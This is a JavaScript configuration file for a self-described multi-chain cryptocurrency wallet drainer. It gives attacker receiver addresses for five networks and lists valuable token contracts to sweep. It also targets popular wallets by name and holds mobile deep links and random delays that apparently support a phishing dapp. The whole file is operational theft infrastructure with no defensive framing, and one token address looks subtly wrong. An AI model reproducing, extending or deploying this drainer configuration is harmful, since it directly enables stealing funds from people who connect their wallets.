// Multi-Chain Wallet Drainer Configuration
window.DRAINER_CONFIG = {
    // Receiver addresses for each network
    RECEIVER_ADDRESSES: {
        ethereum: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49",
        bsc: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", 
        solana: "4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s", // Solana address format
        tron: "TGdWPEEiDxiJPZskJhnJYZBKw3qbGUDXoU", // Tron address format
        bitcoin: "bc1qjr88m5ne8hzk0uw7mdh80m5apa8da9n5wag900" // Bitcoin address format
    },

    // Network configurations
    NETWORKS: {
        ethereum: {
            name: "Ethereum",
            chainId: 1,
            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
            rpcUrls: [
                "https://eth-mainnet.g.alchemy.com/v2/demo",
                "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
                "https://cloudflare-eth.com"
            ],
            blockExplorerUrls: ["https://etherscan.io"],
            gasLimit: {
                transfer: 21000,
                token: 65000
            }
        },
        bsc: {
            name: "BNB Smart Chain",
            chainId: 56,
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: [
                "https://bsc-dataseed1.binance.org",
                "https://bsc-dataseed2.binance.org",
                "https://bsc-dataseed3.binance.org"
            ],
            blockExplorerUrls: ["https://bscscan.com"],
            gasLimit: {
                transfer: 21000,
                token: 65000
            }
        },
        solana: {
            name: "Solana",
            cluster: "mainnet-beta",
            rpcUrls: [
                "https://api.mainnet-beta.solana.com",
                "https://solana-api.projectserum.com"
            ],
            blockExplorerUrls: ["https://explorer.solana.com"]
        },
        tron: {
            name: "Tron",
            fullHost: "https://api.trongrid.io",
            solidityNode: "https://api.trongrid.io",
            eventServer: "https://api.trongrid.io",
            blockExplorerUrls: ["https://tronscan.org"]
        },
        bitcoin: {
            name: "Bitcoin",
            network: "mainnet",
            blockExplorerUrls: ["https://blockstream.info"]
        }
    },

    // Token contracts for each network
    TOKENS: {
        ethereum: [
            { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
            { symbol: "USDC", address: "0xA0b86a33E6417a174f4dCc5B814094b8D1f57b69", decimals: 6 },
            { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
            { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
            { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
            { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
            { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
            { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
            { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
            { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
        ],
        bsc: [
            { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
            { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
            { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
            { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
            { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
            { symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 },
            { symbol: "ETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 },
            { symbol: "ADA", address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47", decimals: 18 },
            { symbol: "DOT", address: "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402", decimals: 18 },
            { symbol: "DOGE", address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 }
        ],
        solana: [
            // SPL tokens on Solana
            { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
            { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 },
            { symbol: "SOL", mint: "So11111111111111111111111111111111111111112", decimals: 9 },
            { symbol: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", decimals: 6 },
            { symbol: "SRM", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt", decimals: 6 }
        ],
        tron: [
            // TRC-20 tokens
            { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
            { symbol: "USDC", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
            { symbol: "TUSD", address: "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4", decimals: 18 },
            { symbol: "JST", address: "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9", decimals: 18 },
            { symbol: "SUN", address: "TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S", decimals: 18 }
        ]
    },

    // Wallet configurations
    WALLETS: {
        ethereum: [
            { name: "MetaMask", key: "isMetaMask", icon: "metamask.png" },
            { name: "Coinbase Wallet", key: "isCoinbaseWallet", icon: "coinbase.png" },
            { name: "Trust Wallet", key: "isTrust", icon: "trust.png" },
            { name: "Rainbow", key: "isRainbow", icon: "rainbow.png" },
            { name: "Phantom", key: "isPhantom", icon: "phantom.png" },
            { name: "WalletConnect", type: "walletconnect", icon: "walletconnect.png" }
        ],
        bsc: [
            { name: "MetaMask", key: "isMetaMask", icon: "metamask.png" },
            { name: "Trust Wallet", key: "isTrust", icon: "trust.png" },
            { name: "Binance Wallet", key: "isBinance", icon: "binance.png" },
            { name: "SafePal", key: "isSafePal", icon: "safepal.png" },
            { name: "WalletConnect", type: "walletconnect", icon: "walletconnect.png" }
        ],
        solana: [
            { name: "Phantom", key: "isPhantom", icon: "phantom.png" },
            { name: "Solflare", key: "isSolflare", icon: "solflare.png" },
            { name: "Slope", key: "isSlope", icon: "slope.png" },
            { name: "Sollet", key: "isSollet", icon: "sollet.png" },
            { name: "Glow", key: "isGlow", icon: "glow.png" }
        ],
        tron: [
            { name: "TronLink", key: "isTronLink", icon: "tronlink.png" },
            { name: "TronMask", key: "isTronMask", icon: "tronmask.png" },
            { name: "Math Wallet", key: "isMathWallet", icon: "mathwallet.png" }
        ],
        bitcoin: [
            { name: "Unisat", key: "isUnisat", icon: "unisat.png" },
            { name: "Xverse", key: "isXverse", icon: "xverse.png" },
            { name: "Hiro Wallet", key: "isHiro", icon: "hiro.png" },
            { name: "OKX Wallet", key: "isOkxWallet", icon: "okx.png" }
        ]
    },

    // Mobile deep links
    MOBILE_LINKS: {
        ethereum: {
            "metamask": "https://metamask.app.link/dapp/",
            "trust": "https://link.trustwallet.com/open_url?coin_id=60&url=",
            "coinbase": "https://go.cb-w.com/dapp?cb_url=",
            "rainbow": "https://rainbow.me/dapp?url="
        },
        bsc: {
            "metamask": "https://metamask.app.link/dapp/",
            "trust": "https://link.trustwallet.com/open_url?coin_id=56&url=",
            "binance": "https://app.binance.com/cedefi/",
            "safepal": "https://link.safepal.io/dapp/"
        },
        solana: {
            "phantom": "https://phantom.app/ul/browse/",
            "solflare": "https://solflare.com/access-wallet"
        },
        tron: {
            "tronlink": "https://www.tronlink.org/"
        }
    },

    // Gas settings
    GAS_SETTINGS: {
        ethereum: {
            gasLimitMultiplier: 1.2,
            gasPriceMultiplier: 1.1,
            priorityFee: "2000000000" // 2 gwei
        },
        bsc: {
            gasLimitMultiplier: 1.1,
            gasPriceMultiplier: 1.05,
            gasPrice: "5000000000" // 5 gwei
        }
    },

    // UI Configuration
    UI: {
        showNetworkStats: true,
        showConnectionStatus: true,
        enableAnimations: true,
        theme: "gradient"
    },

    // Security settings
    SECURITY: {
        maxRetries: 3,
        timeoutDuration: 30000, // 30 seconds
        confirmationBlocks: {
            ethereum: 1,
            bsc: 1,
            solana: 1,
            tron: 1
        }
    },

    // Feature flags
    FEATURES: {
        multiChainSupport: true,
        mobileWalletSupport: true,
        walletConnectSupport: true,
        batchTransactions: true,
        gasOptimization: true
    }
};

// Utility functions
window.DRAINER_UTILS = {
    isMobile: () => {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    },
    
    formatAddress: (address, length = 8) => {
        if (!address) return '';
        return `${address.slice(0, length)}...${address.slice(-4)}`;
    },
    
    formatBalance: (balance, decimals = 4) => {
        return parseFloat(balance).toFixed(decimals);
    },
    
    sleep: (ms) => {
        return new Promise(resolve => setTimeout(resolve, ms));
    },
    
    generateRandomDelay: (min = 1000, max = 3000) => {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
};
